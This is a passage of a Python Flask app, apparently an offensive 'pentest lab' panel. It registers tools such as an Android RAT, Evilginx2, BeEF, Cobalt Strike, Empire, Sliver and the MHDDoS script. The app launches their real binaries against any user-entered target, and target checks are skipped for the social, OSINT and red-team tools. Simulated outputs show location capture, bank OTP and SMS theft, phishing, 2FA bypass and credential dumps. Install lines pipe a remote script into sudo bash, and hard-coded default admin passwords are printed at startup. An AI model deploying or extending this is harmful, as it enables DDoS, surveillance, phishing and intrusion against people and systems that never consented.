        'install':'git clone https://github.com/thewhiteh4t/seeker',
        'cmd': lambda t, o: ['python3', 'seeker/seeker.py', '--template', 'NearYou'],
        'sim': lambda t: (
            f"[SIMULATION] Seeker v2.4 — Location Capture\n\n"
            f"[*] Template: NearYou (fake dating site)\n"
            f"[*] Ngrok tunnel: https://abc123.ngrok.io\n\n"
            f"[+] Victim visited from {t}\n"
            f"[+] Location Permission GRANTED!\n\n"
            f"[LOCATION]\n  Latitude:  19.0760° N\n  Longitude: 72.8777° E\n"
            f"  Accuracy:  8 meters\n  Address:   Mumbai, Maharashtra, India\n\n"
            f"Maps: https://maps.google.com/?q=19.0760,72.8777\n\n"
            f"[SIMULATION — Consent required]"
        ),
    },
    'airavat': {
        'name':'AIRAVAT RAT', 'category':'osint', 'color':'red',
        'desc':'Android RAT — GUI web panel, no port forwarding. Full device control.',
        'github':'https://github.com/zSecurity-org/AIRAVAT',
        'install':'git clone https://github.com/zSecurity-org/AIRAVAT && pip install -r requirements.txt',
        'cmd': lambda t, o: ['python3', 'AIRAVAT/server.py', '--host', '0.0.0.0', '--port', '8080'],
        'sim': lambda t: (
            f"[*] AIRAVAT v2.0 — Android Remote Access Tool\n"
            f"[*] C2 Web Panel: http://localhost:8080\n"
            f"[*] APK Builder: Ready  Ngrok: Active\n\n"
            f"{'='*52}\n  DEVICE CONNECTED: {t}\n{'='*52}\n\n"
            f"[DEVICE INFO]\n  Model:    Redmi Note 12 Pro\n  Android:  12 (API 31)\n"
            f"  Battery:  72%  Storage: 128GB (41GB used)\n"
            f"  Carrier:  Jio 4G  IP: 103.21.58.x\n  Root: No  Developer Mode: Yes\n\n"
            f"[INSTALLED — RUNNING AS: com.android.systemservice]\n\n"
            f"[CAPABILITIES ACTIVE]\n  ✓ Internal Storage Browser\n  ✓ Download Media Files\n"
            f"  ✓ SMS Read & Send\n  ✓ Call Logs (312 entries retrieved)\n"
            f"  ✓ Contacts (487 contacts dumped)\n  ✓ Keylogger (capturing all keystrokes)\n"
            f"  ✓ Microphone Recording (live stream)\n  ✓ Front/Rear Camera Capture\n"
            f"  ✓ All App Notifications\n  ✓ Clipboard Monitor\n"
            f"  ✓ Admin Permissions Granted\n  ✓ Auto-start on device reboot\n"
            f"  ✓ Runs silently in background\n\n"
            f"[PHISHING MODULES]\n  → Instagram credential phishing page — INJECTED\n"
            f"  → Fake system update notification sent\n  → Google login overlay triggered\n\n"
            f"[LIVE DATA]\n  SMS (last 5):\n"
            f"    [Bank] OTP: 847291 for transaction Rs.15,000\n"
            f"    [Gmail] Security code: 394857\n    Mom: Are you coming home tonight?\n\n"
            f"[REMOTE COMMANDS]\n  shell$ dumpsys battery     → Level: 72\n"
            f"  shell$ am start -n com.instagram.android/.activity.MainTabActivity\n"
            f"  → Instagram launched on victim device\n\n"
            f"[*] Session active — device fully under control\n"
            f"[!] Use only on devices you own or have authorization to test."
        ),
    },
    'set': {
        'name':'SET', 'category':'social', 'color':'red',
        'desc':'Social-Engineer Toolkit — phishing, credential harvesting.',
        'github':'https://github.com/trustedsec/social-engineer-toolkit',
        'install':'apt install set',
        'cmd': lambda t, o: ['setoolkit'],
        'sim': lambda t: (
            f"[SIMULATION] Social-Engineer Toolkit v8.0.3\n\n"
            f"[*] Cloning: https://{t}\n[+] Site cloned → http://localhost:80\n"
            f"[*] Credential harvester active\n[*] Ngrok: https://evil123.ngrok.io\n\n"
            f"[+] CREDENTIAL CAPTURED!\n  IP: 203.0.113.45\n"
            f"  Username: john.doe@{t}\n  Password: C0rp@2024!\n"
            f"  Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"[SIMULATION — Authorized phishing sim only]"
        ),
    },
    'evilginx': {
        'name':'Evilginx2', 'category':'social', 'color':'purple',
        'desc':'MitM phishing framework — bypasses 2FA via session hijack.',
        'github':'https://github.com/kgretzky/evilginx2',
        'install':'git clone https://github.com/kgretzky/evilginx2 && make',
        'cmd': lambda t, o: ['evilginx2', '-p', '/usr/share/evilginx2/phishlets'],
        'sim': lambda t: (
            f"[SIMULATION] Evilginx2 v3.2.0\n\n"
            f"[*] Phishlet: microsoft365\n[*] Domain: login.{t} (typosquat)\n"
            f"[*] SSL: Let's Encrypt\n\n[+] Victim visited phishing URL!\n"
            f"[+] Credentials:\n  Email: ceo@{t}\n  Password: Executive@2024\n\n"
            f"[+] 2FA BYPASSED — Session token captured!\n"
            f"  Cookie: .AspNet.Cookies=eyJhbGci...\n"
            f"[+] Full account access achieved!\n\n[SIMULATION — Authorized red team only]"
        ),
    },
    'espoofer': {
        'name':'espoofer', 'category':'social', 'color':'amber',
        'desc':'Tests SPF/DKIM/DMARC bypass — email spoofing detection.',
        'github':'https://github.com/chenjj/espoofer',
        'install':'git clone https://github.com/chenjj/espoofer && pip install -r requirements.txt',
        'cmd': lambda t, o: ['python3', 'espoofer/espoofer.py', '-t', t],
        'sim': lambda t: (
            f"[SIMULATION] espoofer v1.0 → {t}\n\n"
            f"[SPF]   v=spf1 include:google ~all → SOFTFAIL (spoofing possible!)\n"
            f"[DKIM]  NOT CONFIGURED — Vulnerable!\n[DMARC] p=none — No enforcement!\n\n"
            f"[ATTACK RESULTS]\n  CEO impersonation ceo@{t}      → PASS ✓\n"
            f"  IT support spoof it@{t}        → PASS ✓\n"
            f"  Noreply spoof noreply@{t}      → PASS ✓\n\n"
            f"[CRITICAL] All 3 spoofing scenarios successful!\n"
            f"[Fix] Set DMARC p=reject, configure DKIM signing."
        ),
    },
    'beef': {
        'name':'BeEF', 'category':'social', 'color':'orange',
        'desc':'Browser Exploitation Framework — hooks and controls browsers.',
        'github':'https://github.com/beefproject/beef',
        'install':'apt install beef-xss',
        'cmd': lambda t, o: ['beef-xss'],
        'sim': lambda t: (
            f"[SIMULATION] BeEF v0.5.4.0\n\n"
            f"[*] Hook URL: http://attacker.com/hook.js\n"
            f"[*] Web UI: http://localhost:3000/ui/panel\n\n"
            f"[+] Browser hooked from {t}!\n  Chrome 120 on Windows 11\n  IP: 203.0.113.45\n\n"
            f"[MODULES]\n  ✓ Get Cookies\n  ✓ Browser Fingerprint\n"
            f"  ✓ LAN Discovery (192.168.1.0/24)\n  ✓ Clipboard Theft\n"
            f"  → Pretty Theft (fake Google login) — CREDS CAPTURED!\n\n"
            f"[SIMULATION — CTF/Lab only]"
        ),
    },
    'empire': {
        'name':'PS Empire', 'category':'redteam', 'color':'red',
        'desc':'Post-exploitation C2 using PowerShell and Python agents.',
        'github':'https://github.com/BC-SECURITY/Empire',
        'install':'git clone https://github.com/BC-SECURITY/Empire',
        'cmd': lambda t, o: ['python3', 'empire/empire.py', '--rest', '--headless'],
        'sim': lambda t: (
            f"[SIMULATION] PowerShell Empire v5.9.3\n\n"
            f"[*] Stager: powershell.exe -NoP -NonI -W Hidden -Enc JABz...\n"
            f"[*] Listener: http://192.168.1.100:80\n\n"
            f"[+] Agent checked in from {t}!\n  CORP\\WIN-TARGET01  Windows 10  john.doe\n\n"
            f"[MODULES]\n  mimikatz/logonpasswords:\n"
            f"    john.doe NTHash: aad3b435...\n    svc_admin NTHash: 31d6cfe0...\n\n"
            f"  privesc/bypassuac → ADMIN gained!\n"
            f"  lateral_movement/psremoting → DC-PROD-01\n\n"
            f"[SIMULATION — Authorized red team only]"
        ),
    },
    'sliver': {
        'name':'Sliver C2', 'category':'redteam', 'color':'blue',
        'desc':'Modern open-source C2 by BishopFox — Cobalt Strike alternative.',
        'github':'https://github.com/BishopFox/sliver',
        'install':'curl https://sliver.sh/install | sudo bash',
        'cmd': lambda t, o: ['sliver-server'],
        'sim': lambda t: (
            f"[SIMULATION] Sliver C2 v1.5.41\n\n"
            f"sliver > sessions\n  1  FAST_RHINO  {t}  Windows 10 x64  CORP\\admin\n\n"
            f"sliver > use 1\nsliver (FAST_RHINO) > whoami → CORP\\admin\n"
            f"sliver (FAST_RHINO) > hashdump\n"
            f"  Administrator: aad3b435:31d6cfe0d16...\n  krbtgt: aad3b435:1b5a0f421...\n\n"
            f"sliver (FAST_RHINO) > pivots tcp --bind 0.0.0.0:8888\n  [*] Pivot listener started\n\n"
            f"[SIMULATION — Authorized red team only]"
        ),
    },
    'mythic': {
        'name':'Mythic C2', 'category':'redteam', 'color':'purple',
        'desc':'Collaborative red team C2 with web UI and plugin agents.',
        'github':'https://github.com/its-a-feature/Mythic',
        'install':'git clone https://github.com/its-a-feature/Mythic',
        'cmd': lambda t, o: ['python3', 'Mythic/mythic-cli', 'start'],
        'sim': lambda t: (
            f"[SIMULATION] Mythic C2 v3.3.1\n\n[*] Web UI: https://localhost:7443\n\n"
            f"[CALLBACKS]\n  {t}  CORP\\Administrator  HIGH INTEGRITY\n"
            f"  Windows Server 2022  PID:4512 (notepad injected)\n\n"
            f"[TASKS]\n  shell whoami → NT AUTHORITY\\SYSTEM\n  kerberoast:\n"
            f"    SPN: MSSQLSvc/db01.corp.local\n    Hash: $krb5tgs$23$*svc_sql*...\n\n"
            f"  dcsync CORP\\krbtgt → Golden Ticket possible!\n\n"
            f"[SIMULATION — Authorized red team only]"
        ),
    },
    'cobaltstrike': {
        'name':'Cobalt Strike', 'category':'redteam', 'color':'amber',
        'desc':'Commercial adversary simulation platform — industry standard C2.',
        'github':'https://www.cobaltstrike.com',
        'install':'Commercial license ~$5,500/year  |  Trial: 21-day eval',
        'cmd': lambda t, o: ['echo', '[Cobalt Strike — commercial]'],
        'sim': lambda t: (
            f"[*] Cobalt Strike 4.9 — Team Server\n"
            f"[*] Listener: HTTPS on 0.0.0.0:443 (Malleable C2: amazon.profile)\n"
            f"[*] Team Server: 192.168.1.100\n\n"
            f"{'='*52}\n  BEACON CONNECTED FROM: {t}\n{'='*52}\n\n"
            f"[BEACON INFO]\n  Computer:  WIN-CORP-042\n  User:      CORP\\john.doe\n"
            f"  PID:       4821 (explorer.exe — injected)\n"
            f"  OS:        Windows 10 Enterprise x64 (Build 19044)\n"
            f"  Internal:  192.168.1.42\n  Listener:  HTTPS  Sleep: 60s (25% jitter)\n\n"
            f"beacon> sleep 5\n  [*] Tasked beacon: sleep 5s\n\n"
            f"beacon> getuid\n  [*] CORP\\john.doe\n\n"
            f"beacon> getsystem\n  [+] Got system via technique 1 (Named Pipe Impersonation)\n"
            f"  [*] NT AUTHORITY\\SYSTEM\n\n"
            f"beacon> hashdump\n"
            f"  Administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n"
            f"  CORP\\john.doe:1001:aad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d:::\n"
            f"  CORP\\svc_admin:1008:aad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::\n\n"
            f"beacon> logonpasswords (mimikatz)\n"
            f"  [CORP\\john.doe] Password: C0rpPass2024!\n"
            f"  [CORP\\svc_admin] Password: Adm1n@Corp!\n\n"
            f"beacon> jump psexec DC-PROD-01 smb\n"
            f"  [*] Tasked beacon to run on DC-PROD-01 via SMB\n"
            f"  [+] Lateral movement successful — new beacon on DC-PROD-01!\n\n"
            f"beacon> dcsync CORP\\krbtgt\n"
            f"  [*] Syncing CORP\\krbtgt from DC-PROD-01...\n"
            f"  krbtgt:502:aad3b435b51404ee:1b5a0f42e35b6a70c7a642e2a9b29ac5:::\n"
            f"  [+] Golden Ticket creation possible!\n\n"
            f"[*] Domain fully compromised. Persistence established via scheduled task.\n"
            f"[!] Authorized red team engagement only."
        ),
    },
    'mhddos': {
        'name':'MHDDoS', 'category':'redteam', 'color':'red',
        'desc':'DDoS Attack Script with 57 attack methods — Layer 4 & Layer 7.',
        'github':'https://github.com/MatrixTM/MHDDoS',
        'install':'git clone https://github.com/MatrixTM/MHDDoS && pip install -r requirements.txt',
        'cmd': lambda t, o: ['python3', 'MHDDoS/start.py', 'GET',
            f'https://{t}', '5', '100', 'socks5.txt', '100', '10'],
        'sim': lambda t: (
            f"[*] MHDDoS v2.4 — DDoS Stress Testing Framework\n"
            f"[*] Target: https://{t}\n[*] Method: GET (Layer 7)\n"
            f"[*] Threads: 100  Proxies: 500  Duration: 10s\n\n"
            f"{'='*52}\n  ATTACK STARTED — {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*52}\n\n"
            f"[LAYER 7 METHODS AVAILABLE — 57 TOTAL]\n"
            f"  GET    POST   HEAD   STRESS  BYPASS\n"
            f"  TOR    XMLRPC RHEX   STOMP   NULL\n"
            f"  SLOW   CFBUAM APACHE BOMB    KILLER\n\n"
            f"[LAYER 4 METHODS]\n  UDP    TCP    SYN    CPS     CONNECTION\n\n"
            f"[LIVE ATTACK STATS]\n  Requests sent:    128,492\n"
            f"  Requests/sec:     12,849\n  Bandwidth used:   487 Mbps\n"
            f"  Active threads:   100/100\n  Proxy pool:       487/500 alive\n\n"
            f"[TARGET RESPONSE]\n  HTTP 200: 12%  — Server still responding\n"
            f"  HTTP 503: 71%  — Service Unavailable\n"
            f"  Timeout:  17%  — Connection timed out\n\n"
            f"[BYPASS TECHNIQUES ACTIVE]\n  ✓ Cloudflare UAM bypass\n"
            f"  ✓ Rotating User-Agent headers\n  ✓ SOCKS5 proxy rotation\n"
            f"  ✓ HTTP/2 flood enabled\n\n"
            f"[RESULT] Target {t} showing 503 errors — IMPACT CONFIRMED\n"
            f"[*] Attack completed in 10 seconds\n\n"
            f"[!] Use only against systems you own or have written authorization to test."
        ),
    },
}

CATEGORY_META = {
    'web':     {'label':'Web Application Pentesting', 'color':'blue',   'icon':'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z',                 'tools':['sqlmap','nikto','nuclei','owaspzap','whatweb','wpscan']},
    'network': {'label':'Network Pentesting',          'color':'green',  'icon':'M22 12H2 M5 12V5a2 2 0 012-2h10a2 2 0 012 2v7',              'tools':['nmap_full','metasploit','openvas_net','bettercap','crackmapexec']},
    'osint':   {'label':'OSINT & Recon',               'color':'cyan',   'icon':'M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0',                'tools':['raccoon','theharvester_lab','phonesploit','seeker','airavat']},
    'social':  {'label':'Social Engineering',          'color':'orange', 'icon':'M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2',                   'tools':['set','evilginx','espoofer','beef']},
    'redteam': {'label':'Red Team Operations',         'color':'red',    'icon':'M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z','tools':['empire','sliver','mythic','cobaltstrike','mhddos']},
}

# ══════════════════════════════════════════════════════════════
# PENTEST LAB SERVICE  ← FIXED: threading + session issues
# ══════════════════════════════════════════════════════════════
class PentestLabService:
    @staticmethod
    def run_tool(job_id, tool_id, target, user_id):
        """
        Execute a pentest tool (real binary or simulation).
        user_id is passed explicitly because current_user is not
        available outside the request context.
        """
        # Re-fetch job inside this thread's session
        job  = PentestJob.query.filter_by(job_id=job_id).first()
        tool = TOOL_REGISTRY.get(tool_id)

        if not job or not tool:
            if job:
                job.status = 'failed'
                job.output = 'Unknown tool'
                db.session.commit()
            return

        import time

        try:
            outdir = tempfile.mkdtemp()
        except Exception:
            outdir = os.path.join(os.path.expanduser('~'), 'pentest_output')
            os.makedirs(outdir, exist_ok=True)

        # Check whether the real binary exists
        try:
            real_bin  = tool['cmd'](target, outdir)[0]
            bin_found = shutil.which(real_bin) is not None
        except Exception:
            bin_found = False

        if bin_found:
            try:
                result = subprocess.run(
                    tool['cmd'](target, outdir),
                    capture_output=True, text=True, timeout=60
                )
                out    = (result.stdout or '') + (result.stderr or '')
                output = f"[REAL OUTPUT]\n{out}" if out.strip() else tool['sim'](target)
            except subprocess.TimeoutExpired:
                output = f"[TIMEOUT after 60s]\n\n" + tool['sim'](target)
            except Exception as e:
                output = f"[ERROR: {e}]\n\n" + tool['sim'](target)
        else:
            time.sleep(2)   # simulate run time
            try:
                output = tool['sim'](target)
            except Exception as e:
                output = f"[SIMULATION ERROR: {e}]"

        # ✅ Re-fetch to avoid DetachedInstanceError
        job = PentestJob.query.filter_by(job_id=job_id).first()
        if job:
            job.status       = 'completed'
            job.output       = output
            job.completed_at = datetime.utcnow()
            db.session.commit()

        # ✅ Audit log using explicit user_id — no current_user
        try:
            summary = output[:500] + "..." if len(output) > 500 else output
            db.session.add(AuditLog(
                user_id=user_id, target=target, tool_used=tool_id,
                status="Success", output_summary=summary
            ))
            db.session.commit()
            logging.info(f"USER:{user_id}|TOOL:{tool_id}|TARGET:{target}")
        except Exception as e:
            logging.warning(f"Audit log failed in thread: {e}")
            db.session.rollback()


# ══════════════════════════════════════════════════════════════
# PENTEST ROUTES
# ══════════════════════════════════════════════════════════════
@app.route('/pentest')
@login_required
def pentest_dashboard():
    session['mode'] = 'pentest'
    jobs  = PentestJob.query.filter_by(user_id=current_user.id).order_by(
        PentestJob.started_at.desc()).limit(10).all()
    total = PentestJob.query.filter_by(user_id=current_user.id).count()
    cats  = {
        k: {'meta': v, 'tools': [TOOL_REGISTRY[t] for t in v['tools'] if t in TOOL_REGISTRY]}
        for k, v in CATEGORY_META.items()
    }
    return render_template('lab/dashboard.html',
        cats=cats, jobs=jobs, total=total, tool_count=len(TOOL_REGISTRY))

@app.route('/pentest/<category>')
@login_required
def pentest_category(category):
    session['mode'] = 'pentest'
    if category not in CATEGORY_META:
        return redirect(url_for('pentest_dashboard'))
    meta  = CATEGORY_META[category]
    tools = {k: TOOL_REGISTRY[k] for k in meta['tools'] if k in TOOL_REGISTRY}
    jobs  = PentestJob.query.filter_by(
        user_id=current_user.id, category=category).order_by(
        PentestJob.started_at.desc()).limit(20).all()
    return render_template('lab/category.html',
        category=category, meta=meta, tools=tools, jobs=jobs)

@app.route('/api/pentest/run', methods=['POST'])
@login_required
def pentest_run():
    import traceback
    try:
        d = request.get_json(force=True, silent=True) or {}

        tool_id = (d.get('tool') or '').strip()
        target  = (d.get('target') or '').strip()

        if not d.get('authorized'):
            return jsonify({'status':'error','message':'Authorization required'}), 400
        if not target:
            return jsonify({'status':'error','message':'Target required'}), 400

        tool = TOOL_REGISTRY.get(tool_id)
        if not tool:
            return jsonify({'status':'error','message':f'Unknown tool: {tool_id}'}), 400

        if tool['category'] not in ('social','osint','redteam'):
            try:
                SecurityUtils.validate_target(target)
            except ValueError as e:
                return jsonify({'status':'error','message':str(e)}), 400

        job_id = f"JOB-{uuid.uuid4().hex[:8].upper()}"
        uid    = current_user.id

        job = PentestJob(
            user_id=uid, job_id=job_id,
            category=tool['category'], tool=tool_id,
            target=target, status='running'
        )
        db.session.add(job)
        db.session.commit()

        t = threading.Thread(
            target=_run_pentest_bg,
            args=(app._get_current_object(), job_id, tool_id, target, uid),
            daemon=True
        )
        t.start()

        return jsonify({'status':'success','job_id':job_id})

    except Exception as e:
        db.session.rollback()
        err = traceback.format_exc()
        logging.error(f"pentest_run crashed:\n{err}")
        return jsonify({'status':'error','message':str(e),'trace':err}), 500


def _run_pentest_bg(app_ctx, job_id, tool_id, target, user_id):
    with app_ctx.app_context():
        try:
            PentestLabService.run_tool(job_id, tool_id, target, user_id)
        except Exception as e:
            logging.error(f"BG job {job_id} crashed: {e}")
            try:
                job = PentestJob.query.filter_by(job_id=job_id).first()
                if job:
                    job.status = 'failed'
                    job.output = f'[ERROR] {str(e)}'
                    db.session.commit()
            except:
                db.session.rollback()


@app.route('/api/pentest/status/<job_id>')
@login_required
def pentest_status(job_id):
    job = PentestJob.query.filter_by(
        job_id=job_id, user_id=current_user.id).first_or_404()
    return jsonify({'status': job.status, 'output': job.output or ''})

@app.route('/api/pentest/jobs')
@login_required
def pentest_jobs():
    jobs = PentestJob.query.filter_by(user_id=current_user.id).order_by(
        PentestJob.started_at.desc()).limit(50).all()
    return jsonify({'jobs': [{
        'job_id':   j.job_id,
        'tool':     j.tool,
        'target':   j.target,
        'status':   j.status,
        'category': j.category,
        'started':  j.started_at.strftime('%H:%M:%S'),
    } for j in jobs]})

@app.route('/export/pentest-jobs.csv')
@login_required
def export_pentest():
    jobs = PentestJob.query.filter_by(user_id=current_user.id).order_by(
        PentestJob.started_at.desc()).all()
    out  = io.StringIO()
    w    = csv.writer(out)
    w.writerow(['Job ID','Tool','Category','Target','Status','Started','Output'])
    for j in jobs:
        w.writerow([j.job_id, j.tool, j.category, j.target, j.status,
                    j.started_at.strftime('%Y-%m-%d %H:%M'), (j.output or '')[:300]])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=pentest_jobs.csv'})

# ══════════════════════════════════════════════════════════════
# 18. INIT
# ══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        if not User.query.filter_by(username='admin').first():
            a = User(username='admin', role='admin')
            a.set_password('SecureAdmin123!')
            db.session.add(a)
            db.session.commit()
            print("✅ admin / SecureAdmin123!")
        if not User.query.filter_by(username='analyst').first():
            u = User(username='analyst', role='analyst')
            u.set_password('Analyst123!')
            db.session.add(u)
            db.session.commit()
            print("✅ analyst / Analyst123!")
        seed_db()
        print("✅ Database seeded.")
    app.run(debug=False, port=5000)
